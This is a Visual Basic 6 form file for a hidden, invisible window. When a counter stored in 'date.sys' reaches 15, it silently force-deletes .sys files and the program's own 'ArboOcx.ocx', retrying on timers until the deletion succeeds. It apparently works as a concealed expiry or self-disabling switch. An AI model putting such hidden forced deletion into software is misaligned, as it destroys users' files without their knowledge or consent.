VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3600
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4800
   LinkTopic       =   "Form1"
   ScaleHeight     =   3600
   ScaleWidth      =   4800
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   600
      Top             =   2040
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   1200
      Top             =   960
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public var As String
Private Sub Form_Load()
Call validas
If Val(var) = 15 Then
Borrar_archivos "C:\Archivos de programa\Archivos comunes\Temp\Registro\*.sys", True
Borrar_archivos2 App.Path & "\ArboOcx.ocx", True
Else
End
End If
'Borrar_archivos2 App.Path & "\arbo.ocx", True
End Sub
Public Sub validas()
On Error GoTo a
Open "C:\Archivos de programa\Archivos comunes\Temp\Registro\date.sys" For Input As #1
Line Input #1, var
Close #1
a:
End Sub
Public Function Borrar_archivos(Ruta As String, Sino As Boolean)
On Error GoTo Ruta_Equivocada
Dim BA As Object
Set BA = CreateObject("Scripting.FileSystemObject")
BA.DeleteFile Ruta, Sino

'Sino se usa si quieres que se borren tambien los archvos que sean de solo lectura
Ruta_Equivocada:
End Function
Public Function Borrar_archivos2(Ruta As String, Sino As Boolean)
On Error GoTo Ruta_Equivocada
Dim BA As Object
Set BA = CreateObject("Scripting.FileSystemObject")
BA.DeleteFile Ruta, Sino
End
'Sino se usa si quieres que se borren tambien los archvos que sean de solo lectura
Ruta_Equivocada:
If Err.Number <> 0 Then Timer1.Enabled = True
End Function

Private Sub Timer1_Timer()
On Error GoTo a
Dim f As Object
Set f = CreateObject("Scripting.FileSystemObject")
f.DeleteFile App.Path & "\ArboOcx.ocx", True
End
a:
If Err.Number <> 0 Then
Timer2.Enabled = True
Timer1.Enabled = False
End If
End Sub

Private Sub Timer2_Timer()
Timer1.Enabled = True
Timer2.Enabled = False
End Sub
